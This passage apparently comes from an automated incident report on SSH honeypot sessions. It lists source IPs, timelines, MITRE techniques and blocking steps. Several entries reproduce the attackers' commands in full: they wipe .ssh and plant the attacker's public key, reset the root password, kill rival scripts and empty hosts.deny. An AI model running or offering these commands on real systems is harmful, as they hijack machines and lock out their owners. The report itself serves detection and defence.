**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:43:21` | `cowrie.session.connect` |
| `2026-04-13 19:43:21` | `cowrie.client.version` |
| `2026-04-13 19:43:21` | `cowrie.client.kex` |
| `2026-04-13 19:43:22` | `cowrie.login.success` |
| `2026-04-13 19:43:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f8c3b884345

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:45 |
| **Last Seen** | 2026-04-13 19:45 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:45:41` | `cowrie.session.connect` |
| `2026-04-13 19:45:41` | `cowrie.client.version` |
| `2026-04-13 19:45:42` | `cowrie.client.kex` |
| `2026-04-13 19:45:42` | `cowrie.login.success` |
| `2026-04-13 19:45:43` | `cowrie.session.params` |
| `2026-04-13 19:45:43` | `cowrie.command.input` |
| `2026-04-13 19:45:43` | `cowrie.command.failed` |
| `2026-04-13 19:45:43` | `cowrie.log.closed` |
| `2026-04-13 19:45:43` | `cowrie.session.params` |
| `2026-04-13 19:45:43` | `cowrie.command.input` |
| `2026-04-13 19:45:44` | `cowrie.session.file_download` |
| `2026-04-13 19:45:44` | `cowrie.log.closed` |
| `2026-04-13 19:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9e24867342a

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:45 |
| **Last Seen** | 2026-04-13 19:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:45:46` | `cowrie.session.connect` |
| `2026-04-13 19:45:46` | `cowrie.client.version` |
| `2026-04-13 19:45:46` | `cowrie.client.kex` |
| `2026-04-13 19:45:47` | `cowrie.login.success` |
| `2026-04-13 19:45:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd494062662b

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:48 |
| **Last Seen** | 2026-04-13 19:48 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:48:04` | `cowrie.session.connect` |
| `2026-04-13 19:48:04` | `cowrie.client.version` |
| `2026-04-13 19:48:05` | `cowrie.client.kex` |
| `2026-04-13 19:48:05` | `cowrie.login.success` |
| `2026-04-13 19:48:06` | `cowrie.session.params` |
| `2026-04-13 19:48:06` | `cowrie.command.input` |
| `2026-04-13 19:48:06` | `cowrie.command.failed` |
| `2026-04-13 19:48:06` | `cowrie.log.closed` |
| `2026-04-13 19:48:06` | `cowrie.session.params` |
| `2026-04-13 19:48:06` | `cowrie.command.input` |
| `2026-04-13 19:48:07` | `cowrie.session.file_download` |
| `2026-04-13 19:48:07` | `cowrie.log.closed` |
| `2026-04-13 19:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-149d5fb605cb

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:48 |
| **Last Seen** | 2026-04-13 19:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:48:09` | `cowrie.session.connect` |
| `2026-04-13 19:48:09` | `cowrie.client.version` |
| `2026-04-13 19:48:09` | `cowrie.client.kex` |
| `2026-04-13 19:48:10` | `cowrie.login.success` |
| `2026-04-13 19:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7e4359f7b71

| Field | Detail |
|---|---|
| **Source IP** | `118.186.7[.]9` |
| **First Seen** | 2026-04-13 19:48 |
| **Last Seen** | 2026-04-13 19:49 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:cVg3OhGH90Z6"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:48:40` | `cowrie.session.connect` |
| `2026-04-13 19:48:40` | `cowrie.client.version` |
| `2026-04-13 19:48:40` | `cowrie.client.kex` |
| `2026-04-13 19:48:41` | `cowrie.login.success` |
| `2026-04-13 19:48:41` | `cowrie.session.params` |
| `2026-04-13 19:48:41` | `cowrie.command.input` |
| `2026-04-13 19:48:41` | `cowrie.command.failed` |
| `2026-04-13 19:48:41` | `cowrie.log.closed` |
| `2026-04-13 19:48:42` | `cowrie.session.params` |
| `2026-04-13 19:48:42` | `cowrie.command.input` |
| `2026-04-13 19:48:42` | `cowrie.session.file_download` |
| `2026-04-13 19:48:42` | `cowrie.log.closed` |
| `2026-04-13 19:48:54` | `cowrie.session.params` |
| `2026-04-13 19:48:54` | `cowrie.command.input` |
| `2026-04-13 19:48:54` | `cowrie.log.closed` |
| `2026-04-13 19:48:55` | `cowrie.session.params` |
| `2026-04-13 19:48:55` | `cowrie.command.input` |
| `2026-04-13 19:48:55` | `cowrie.log.closed` |
| `2026-04-13 19:48:55` | `cowrie.session.params` |
| `2026-04-13 19:48:55` | `cowrie.command.input` |
| `2026-04-13 19:48:55` | `cowrie.session.file_download` |
| `2026-04-13 19:48:55` | `cowrie.log.closed` |
| `2026-04-13 19:48:56` | `cowrie.session.params` |
| `2026-04-13 19:48:56` | `cowrie.command.input` |
| `2026-04-13 19:48:56` | `cowrie.log.closed` |
| `2026-04-13 19:48:56` | `cowrie.session.params` |
| `2026-04-13 19:48:56` | `cowrie.command.input` |
| `2026-04-13 19:48:56` | `cowrie.log.closed` |
| `2026-04-13 19:48:57` | `cowrie.session.params` |
| `2026-04-13 19:48:57` | `cowrie.command.input` |
| `2026-04-13 19:48:57` | `cowrie.command.input` |
| `2026-04-13 19:48:57` | `cowrie.log.closed` |
| `2026-04-13 19:48:57` | `cowrie.session.params` |
| `2026-04-13 19:48:57` | `cowrie.command.input` |
| `2026-04-13 19:48:57` | `cowrie.log.closed` |
| `2026-04-13 19:48:58` | `cowrie.session.params` |
| `2026-04-13 19:48:58` | `cowrie.command.input` |
| `2026-04-13 19:48:58` | `cowrie.log.closed` |
| `2026-04-13 19:48:58` | `cowrie.session.params` |
| `2026-04-13 19:48:58` | `cowrie.command.input` |
| `2026-04-13 19:48:58` | `cowrie.log.closed` |
| `2026-04-13 19:48:59` | `cowrie.session.params` |
| `2026-04-13 19:48:59` | `cowrie.command.input` |
| `2026-04-13 19:48:59` | `cowrie.log.closed` |
| `2026-04-13 19:48:59` | `cowrie.session.params` |
| `2026-04-13 19:48:59` | `cowrie.command.input` |
| `2026-04-13 19:48:59` | `cowrie.log.closed` |
| `2026-04-13 19:49:00` | `cowrie.session.params` |
| `2026-04-13 19:49:00` | `cowrie.command.input` |
| `2026-04-13 19:49:00` | `cowrie.log.closed` |
| `2026-04-13 19:49:00` | `cowrie.session.params` |
| `2026-04-13 19:49:00` | `cowrie.command.input` |
| `2026-04-13 19:49:00` | `cowrie.log.closed` |
| `2026-04-13 19:49:01` | `cowrie.session.params` |
| `2026-04-13 19:49:01` | `cowrie.command.input` |
| `2026-04-13 19:49:01` | `cowrie.log.closed` |
| `2026-04-13 19:49:01` | `cowrie.session.params` |
| `2026-04-13 19:49:01` | `cowrie.command.input` |
| `2026-04-13 19:49:01` | `cowrie.log.closed` |
| `2026-04-13 19:49:02` | `cowrie.session.params` |
| `2026-04-13 19:49:02` | `cowrie.command.input` |
| `2026-04-13 19:49:02` | `cowrie.log.closed` |
| `2026-04-13 19:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.7[.]9` to AbuseIPDB if not already reported
- [ ] Block `118.186.7[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f12ddd2f4d6

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:50 |
| **Last Seen** | 2026-04-13 19:50 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:50:31` | `cowrie.session.connect` |
| `2026-04-13 19:50:31` | `cowrie.client.version` |
| `2026-04-13 19:50:31` | `cowrie.client.kex` |
| `2026-04-13 19:50:32` | `cowrie.login.success` |
| `2026-04-13 19:50:33` | `cowrie.session.params` |
| `2026-04-13 19:50:33` | `cowrie.command.input` |
| `2026-04-13 19:50:33` | `cowrie.command.failed` |
| `2026-04-13 19:50:33` | `cowrie.log.closed` |
| `2026-04-13 19:50:33` | `cowrie.session.params` |
| `2026-04-13 19:50:33` | `cowrie.command.input` |
| `2026-04-13 19:50:34` | `cowrie.session.file_download` |
| `2026-04-13 19:50:34` | `cowrie.log.closed` |
| `2026-04-13 19:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55b55a1b6cc8

| Field | Detail |
|---|---|
| **Source IP** | `103.139.193[.]223` |
| **First Seen** | 2026-04-13 19:50 |
| **Last Seen** | 2026-04-13 19:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:50:36` | `cowrie.session.connect` |
| `2026-04-13 19:50:36` | `cowrie.client.version` |
| `2026-04-13 19:50:36` | `cowrie.client.kex` |
| `2026-04-13 19:50:37` | `cowrie.login.success` |
| `2026-04-13 19:50:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.139.193[.]223` to AbuseIPDB if not already reported
- [ ] Block `103.139.193[.]223` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f17373e6f2b

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 19:51 |
| **Last Seen** | 2026-04-13 19:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:51:16` | `cowrie.session.connect` |
| `2026-04-13 19:51:16` | `cowrie.client.version` |
| `2026-04-13 19:51:17` | `cowrie.client.kex` |
| `2026-04-13 19:51:18` | `cowrie.login.success` |
| `2026-04-13 19:51:19` | `cowrie.session.params` |
| `2026-04-13 19:51:19` | `cowrie.command.input` |
| `2026-04-13 19:51:19` | `cowrie.command.failed` |
| `2026-04-13 19:51:19` | `cowrie.log.closed` |
| `2026-04-13 19:51:20` | `cowrie.session.params` |
| `2026-04-13 19:51:20` | `cowrie.command.input` |
| `2026-04-13 19:51:20` | `cowrie.session.file_download` |
| `2026-04-13 19:51:20` | `cowrie.log.closed` |
| `2026-04-13 19:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a306eb4f4d05

| Field | Detail |
|---|---|
| **Source IP** | `201.77.124[.]248` |
| **First Seen** | 2026-04-13 19:51 |
| **Last Seen** | 2026-04-13 19:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:51:24` | `cowrie.session.connect` |
| `2026-04-13 19:51:24` | `cowrie.client.version` |
| `2026-04-13 19:51:24` | `cowrie.client.kex` |
| `2026-04-13 19:51:26` | `cowrie.login.success` |
| `2026-04-13 19:51:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.77.124[.]248` to AbuseIPDB if not already reported
- [ ] Block `201.77.124[.]248` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c13fdfc21b8

| Field | Detail |
|---|---|
| **Source IP** | `118.186.7[.]9` |
| **First Seen** | 2026-04-13 19:53 |
| **Last Seen** | 2026-04-13 19:53 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:CtvGaDgjjMOx"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:53:33` | `cowrie.session.connect` |
| `2026-04-13 19:53:33` | `cowrie.client.version` |
| `2026-04-13 19:53:34` | `cowrie.client.kex` |
| `2026-04-13 19:53:34` | `cowrie.login.success` |
| `2026-04-13 19:53:35` | `cowrie.session.params` |
| `2026-04-13 19:53:35` | `cowrie.command.input` |
| `2026-04-13 19:53:35` | `cowrie.command.failed` |
| `2026-04-13 19:53:35` | `cowrie.log.closed` |
| `2026-04-13 19:53:35` | `cowrie.session.params` |
| `2026-04-13 19:53:35` | `cowrie.command.input` |
| `2026-04-13 19:53:35` | `cowrie.session.file_download` |
| `2026-04-13 19:53:35` | `cowrie.log.closed` |
| `2026-04-13 19:53:47` | `cowrie.session.params` |
| `2026-04-13 19:53:47` | `cowrie.command.input` |
| `2026-04-13 19:53:48` | `cowrie.log.closed` |
| `2026-04-13 19:53:48` | `cowrie.session.params` |
| `2026-04-13 19:53:48` | `cowrie.command.input` |
| `2026-04-13 19:53:48` | `cowrie.log.closed` |
| `2026-04-13 19:53:48` | `cowrie.session.params` |
| `2026-04-13 19:53:48` | `cowrie.command.input` |
| `2026-04-13 19:53:49` | `cowrie.session.file_download` |
| `2026-04-13 19:53:49` | `cowrie.log.closed` |
| `2026-04-13 19:53:49` | `cowrie.session.params` |
| `2026-04-13 19:53:49` | `cowrie.command.input` |
| `2026-04-13 19:53:49` | `cowrie.log.closed` |
| `2026-04-13 19:53:49` | `cowrie.session.params` |
| `2026-04-13 19:53:49` | `cowrie.command.input` |
| `2026-04-13 19:53:50` | `cowrie.log.closed` |
| `2026-04-13 19:53:50` | `cowrie.session.params` |
| `2026-04-13 19:53:50` | `cowrie.command.input` |
| `2026-04-13 19:53:50` | `cowrie.command.input` |
| `2026-04-13 19:53:50` | `cowrie.log.closed` |
| `2026-04-13 19:53:51` | `cowrie.session.params` |
| `2026-04-13 19:53:51` | `cowrie.command.input` |
| `2026-04-13 19:53:51` | `cowrie.log.closed` |
| `2026-04-13 19:53:51` | `cowrie.session.params` |
| `2026-04-13 19:53:51` | `cowrie.command.input` |
| `2026-04-13 19:53:51` | `cowrie.log.closed` |
| `2026-04-13 19:53:52` | `cowrie.session.params` |
| `2026-04-13 19:53:52` | `cowrie.command.input` |
| `2026-04-13 19:53:52` | `cowrie.log.closed` |
| `2026-04-13 19:53:52` | `cowrie.session.params` |
| `2026-04-13 19:53:52` | `cowrie.command.input` |
| `2026-04-13 19:53:52` | `cowrie.log.closed` |
| `2026-04-13 19:53:53` | `cowrie.session.params` |
| `2026-04-13 19:53:53` | `cowrie.command.input` |
| `2026-04-13 19:53:53` | `cowrie.log.closed` |
| `2026-04-13 19:53:53` | `cowrie.session.params` |
| `2026-04-13 19:53:53` | `cowrie.command.input` |
| `2026-04-13 19:53:53` | `cowrie.log.closed` |
| `2026-04-13 19:53:54` | `cowrie.session.params` |
| `2026-04-13 19:53:54` | `cowrie.command.input` |
| `2026-04-13 19:53:54` | `cowrie.log.closed` |
| `2026-04-13 19:53:54` | `cowrie.session.params` |
| `2026-04-13 19:53:54` | `cowrie.command.input` |
| `2026-04-13 19:53:54` | `cowrie.log.closed` |
| `2026-04-13 19:53:55` | `cowrie.session.params` |
| `2026-04-13 19:53:55` | `cowrie.command.input` |
| `2026-04-13 19:53:55` | `cowrie.log.closed` |
| `2026-04-13 19:53:55` | `cowrie.session.params` |
| `2026-04-13 19:53:55` | `cowrie.command.input` |
| `2026-04-13 19:53:55` | `cowrie.log.closed` |
| `2026-04-13 19:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.186.7[.]9` to AbuseIPDB if not already reported
- [ ] Block `118.186.7[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667aab54c7bc

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-13 19:54 |
| **Last Seen** | 2026-04-13 19:54 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:54:30` | `cowrie.session.connect` |
| `2026-04-13 19:54:30` | `cowrie.client.version` |
| `2026-04-13 19:54:31` | `cowrie.client.kex` |
| `2026-04-13 19:54:31` | `cowrie.login.success` |
| `2026-04-13 19:54:32` | `cowrie.session.params` |
| `2026-04-13 19:54:32` | `cowrie.command.input` |
| `2026-04-13 19:54:32` | `cowrie.command.failed` |
| `2026-04-13 19:54:32` | `cowrie.log.closed` |
| `2026-04-13 19:54:32` | `cowrie.session.params` |
| `2026-04-13 19:54:32` | `cowrie.command.input` |
| `2026-04-13 19:54:32` | `cowrie.session.file_download` |
| `2026-04-13 19:54:32` | `cowrie.log.closed` |
| `2026-04-13 19:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.128.240[.]75` to AbuseIPDB if not already reported
- [ ] Block `27.128.240[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-040678e27aa2

| Field | Detail |
|---|---|
| **Source IP** | `27.128.240[.]75` |
| **First Seen** | 2026-04-13 19:54 |
| **Last Seen** | 2026-04-13 19:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-13 19:54:34` | `cowrie.session.connect` |
| `2026-04-13 19:54:34` | `cowrie.client.version` |
| `2026-04-13 19:54:35` | `cowrie.client.kex` |
| `2026-04-13 19:54:35` | `cowrie.login.success` |
| `2026-04-13 19:54:35` | `cowrie.session.closed` |

